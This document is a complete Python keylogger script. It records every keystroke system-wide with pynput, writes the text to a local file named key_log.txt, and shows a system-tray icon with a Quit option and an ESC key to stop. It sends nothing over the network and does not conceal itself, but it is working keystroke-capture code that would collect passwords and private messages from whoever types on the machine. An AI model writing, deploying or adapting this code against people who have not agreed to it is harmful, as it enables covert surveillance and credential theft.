import datetime
import threading
from pynput.keyboard import Listener, Key
from pystray import Icon, MenuItem, Menu
from PIL import Image, ImageDraw
import sys

# File to save logged keys
log_file = "key_log.txt"

# Add a timestamp at the start of the log
with open(log_file, "a") as f:
    f.write(f"\n\n--- Keylogger started at {datetime.datetime.now()} ---\n")

# Function to log the keys
def log_key(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                # Log regular characters directly
                f.write(key.char)
            elif key == Key.space:
                # Log space as a blank space
                f.write(" ")
            elif key == Key.enter:
                # Log enter as a new line
                f.write("\n")
            elif key == Key.tab:
                # Log tab as a few spaces
                f.write("    ")  # Four spaces for a tab
            elif key == Key.backspace:
                # Log backspace as nothing (or use "<BACKSPACE>" if you want to show it)
                pass
            else:
                # Ignore all other special keys (Shift, Ctrl, etc.)
                pass
    except Exception as e:
        print(f"Error logging key: {e}")

    # Stop the keylogger if 'ESC' is pressed
    if key == Key.esc:
        print("Stopping keylogger...")
        return False  # Stop the Listener

# Function to start the listener in a separate thread
def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

# Function to create an icon for the system tray
def create_tray_icon():
    # Create a simple icon with PIL
    icon_image = Image.new('RGBA', (64, 64), (255, 255, 255, 0))
    draw = ImageDraw.Draw(icon_image)
    draw.rectangle((0, 0, 64, 64), fill="blue")  # Simple blue icon
    
    # Function to quit the program when right-clicked
    def on_quit(icon, item):
        icon.stop()
        sys.exit()

    # Create the tray icon with a menu
    icon = Icon("Keylogger", icon_image, menu=Menu(MenuItem("Quit", on_quit)))
    
    # Start the tray icon
    icon.run()

# Main function to start the keylogger and tray icon
def main():
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Allow the program to exit even if the thread is running
    keylogger_thread.start()

    # Create the tray icon
    create_tray_icon()

if __name__ == "__main__":
    print("Starting keylogger in the background... Press ESC to stop.")
    main()
